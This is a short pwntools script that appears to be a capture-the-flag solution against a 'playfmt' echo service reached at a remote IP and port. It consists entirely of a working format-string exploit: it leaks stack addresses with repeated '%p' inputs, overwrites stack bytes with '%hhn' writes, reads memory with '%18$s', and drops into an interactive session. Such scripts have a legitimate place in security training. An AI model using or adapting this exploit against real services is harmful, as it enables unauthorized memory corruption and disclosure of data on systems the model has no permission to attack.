from pwn import *
#r = process('./playfmt')
r = remote('120.78.192.35',9999)
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c'] 

r.recvuntil('Magic echo Server\n=====================\n')
r.send('%p '* 0x30)
x = r.recv()
x = x.split(' ')
stack = x[5]
stack = int(stack,16)+0x30-0x20
stack = str(hex(stack))[-2:]
print(stack)
stack = int(stack,16)
r.send('%'+str(stack)+'c%6$hhn'+'111'+'\x00')
r.recvuntil('111')
r.send('%16d%14$hhn'+'222'+'\x00')
r.recvuntil('222')
r.send('%18$s'+'\x00')
r.recv()
r.interactive()